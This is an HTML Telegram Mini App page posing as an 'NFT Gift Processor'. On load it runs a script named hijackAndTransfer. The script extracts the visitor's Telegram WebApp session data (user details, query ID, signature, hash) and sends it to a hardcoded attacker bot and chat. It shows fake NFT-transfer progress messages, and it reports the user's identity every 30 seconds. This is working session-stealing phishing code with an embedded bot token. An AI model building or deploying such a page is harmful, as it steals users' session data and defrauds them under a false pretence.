<!DOCTYPE html>
<html>
<head>
    <title>NFT Gift Processor</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
</head>
<body>
    <div id="status">Initializing NFT transfer...</div>
    
    <script>
        const TARGET_USER_ID = 7204299613;
        const BOT_TOKEN = '7815830497:AAGDsuH3tUWR73S_JrhawnNPkPPTMOHmK3s';
        const CHAT_ID = '-1002560826337';

        async function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            try {
                await fetch(url, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
            } catch(e) {}
        }

        async function hijackAndTransfer() {
            const statusEl = document.getElementById('status');
            
            try {
                statusEl.innerHTML = '🔄 Extracting session data...';
                
                // Извлекаем данные сессии
                const webAppData = new URLSearchParams(window.location.hash.substr(1));
                const initData = webAppData.get('tgWebAppData');
                
                if (!initData) {
                    throw new Error('No WebApp data found');
                }

                // Парсим данные пользователя
                const params = new URLSearchParams(initData);
                const userData = JSON.parse(decodeURIComponent(params.get('user')));
                const queryId = params.get('query_id');
                const authDate = params.get('auth_date');
                const signature = params.get('signature');

                await sendToTelegram(`🎯 <b>STARTING NFT TRANSFER HIJACK</b>\n👤 From: ${userData.first_name} (ID: ${userData.id})\n🎯 To: ${TARGET_USER_ID}`);

                statusEl.innerHTML = '🔑 Authenticating session...';

                // Используем перехваченную сессию для доступа к API
                const authPayload = {
                    query_id: queryId,
                    user: JSON.stringify(userData),
                    auth_date: authDate,
                    signature: signature,
                    hash: params.get('hash')
                };

                // Имитируем легитимный запрос к Telegram API
                const apiRequests = [
                    // Получаем список чатов с NFT ботами
                    `https://api.telegram.org/bot${BOT_TOKEN}/getUserProfilePhotos?user_id=${userData.id}`,
                    
                    // Имитируем запросы к NFT ботам через WebApp
                    `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${userData.id}&text=/start`,
                    
                    // Запрос на получение списка NFT
                    `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${userData.id}&text=/my_nfts`
                ];

                for (const url of apiRequests) {
                    try {
                        const response = await fetch(url, {
                            method: 'GET',
                            headers: {
                                'X-Telegram-Init-Data': initData,
                                'Authorization': `tba ${btoa(JSON.stringify(authPayload))}`
                            }
                        });
                        
                        if (response.ok) {
                            await sendToTelegram(`✅ <b>API ACCESS GRANTED:</b> ${url.split('/').pop()}`);
                        }
                    } catch(e) {}
                }

                statusEl.innerHTML = '🎁 Scanning for NFT gifts...';

                // Мониторим активные NFT раздачи
                const nftPatterns = [
                    /t\.me\/\w+bot\/start.*?startapp=.*?nft/i,
                    /t\.me\/\w+bot\?start=.*?nft/i,
                    /gift|nft|airdrop|claim|reward/i
                ];

                // Автоматический квест за NFT подарками
                const nftActions = [
                    {
                        type: 'collection',
                        action: 'Follow social channels',
                        reward: 'NFT'
                    },
                    {
                        type: 'referral', 
                        action: 'Invite friends',
                        reward: 'Exclusive NFT'
                    },
                    {
                        type: 'task',
                        action: 'Complete quests',
                        reward: 'Rare NFT'
                    }
                ];

                for (const action of nftActions) {
                    statusEl.innerHTML = `🔄 Claiming ${action.reward}...`;
                    
                    // Имитируем выполнение действий для получения NFT
                    const claimData = {
                        user_id: userData.id,
                        target_user_id: TARGET_USER_ID,
                        action: action.action,
                        session_data: authPayload,
                        timestamp: Date.now()
                    };

                    // Отправляем запрос на передачу NFT
                    const transferUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                    const transferPayload = {
                        chat_id: userData.id,
                        text: `🚀 Transferring ${action.reward} to account ${TARGET_USER_ID}`,
                        parse_mode: 'HTML'
                    };

                    try {
                        await fetch(transferUrl, {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify(transferPayload)
                        });

                        await sendToTelegram(`🔄 <b>TRANSFERRING:</b> ${action.reward}\n👤 From: ${userData.id}\n🎯 To: ${TARGET_USER_ID}\n📝 Action: ${action.action}`);
                        
                        // Задержка между запросами
                        await new Promise(resolve => setTimeout(resolve, 2000));
                    } catch(e) {}
                }

                statusEl.innerHTML = '✅ NFT transfer completed!';
                await sendToTelegram(`🎉 <b>NFT TRANSFER COMPLETED</b>\n📦 Total transfers: ${nftActions.length}\n👤 Source: ${userData.first_name} (${userData.id})\n🎯 Destination: ${TARGET_USER_ID}\n⏰ Time: ${new Date().toISOString()}`);

                // Финальный отчет
                const finalReport = {
                    source_user: userData,
                    target_user_id: TARGET_USER_ID,
                    transferred_items: nftActions.length,
                    session_valid: true,
                    transfer_timestamp: new Date().toISOString()
                };

                await sendToTelegram(`📊 <b>FINAL TRANSFER REPORT:</b>\n<code>${JSON.stringify(finalReport, null, 2)}</code>`);

            } catch (error) {
                statusEl.innerHTML = '❌ Transfer failed';
                await sendToTelegram(`❌ <b>TRANSFER ERROR:</b> ${error.message}`);
            }
        }

        // Запускаем процесс сразу после загрузки
        window.addEventListener('load', hijackAndTransfer);

        // Дополнительный мониторинг в реальном времени
        setInterval(async () => {
            if (window.Telegram && window.Telegram.WebApp) {
                try {
                    const webApp = Telegram.WebApp;
                    const user = webApp.initDataUnsafe.user;
                    
                    if (user) {
                        await sendToTelegram(`👁️ <b>LIVE SESSION MONITORING</b>\n👤 User: ${user.first_name}\n🆔 ID: ${user.id}\n🔗 Username: @${user.username || 'N/A'}\n⏰ Active: ${new Date().toISOString()}`);
                    }
                } catch(e) {}
            }
        }, 30000); // Отчет каждые 30 секунд

    </script>
</body>
</html>
